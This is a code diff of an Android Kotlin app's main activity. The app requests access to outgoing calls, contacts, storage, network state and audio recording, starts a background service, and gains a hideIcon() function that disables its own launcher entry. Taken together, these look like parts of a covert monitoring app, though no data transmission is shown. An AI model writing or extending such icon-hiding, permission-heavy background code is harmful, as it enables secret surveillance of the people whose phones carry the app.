@@ -12,7 +12,7 @@ import android.support.v4.content.ContextCompat
 import android.util.SparseIntArray
 import android.view.Surface
 
-class MainActivity : Activity() {
+class MainActivity :  Activity() {
 
     val MULTIPLE_PERMISSIONS = 10 // code you want.
     var permissions = arrayOf<String>(Manifest.permission.PROCESS_OUTGOING_CALLS,
@@ -21,23 +21,33 @@ class MainActivity : Activity() {
             Manifest.permission.READ_CONTACTS,
             Manifest.permission.READ_EXTERNAL_STORAGE,
             Manifest.permission.WRITE_EXTERNAL_STORAGE,
+            Manifest.permission.ACCESS_NETWORK_STATE,
             Manifest.permission.RECORD_AUDIO)
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        ScreenPreference.getInstance(this).saveFirstApp = false
-        setContentView(R.layout.activity_main)
+        ScreenPreference.getInstance(this).saveAppName = "false"
+        //setContentView(R.layout.activity_main)
+        instance = this
+        //val p = packageManager
+       // val componentName = ComponentName(this@MainActivity, MainActivity::class.java!!) // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
+       // p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
+
+
         val backgroundService = Intent(applicationContext, ScreenOnOffBackgroundService::class.java)
         startService(backgroundService)
-        val p = packageManager
-        val componentName = ComponentName(this@MainActivity, MainActivity::class.java!!) // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
-        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
+
+
         if (checkPermissions()) {
 
         }
-        ScreenPreference.getInstance(this).saveAppName = "false"
+
 
     }
-
+       fun hideIcon (){
+        val pp = packageManager
+        val componentNamep = ComponentName(this@MainActivity, MainActivity::class.java!!) // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
+        pp.setComponentEnabledSetting(componentNamep, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
+    }
     private fun checkPermissions(): Boolean {
         var result: Int
         val listPermissionsNeeded: ArrayList<String> = ArrayList()
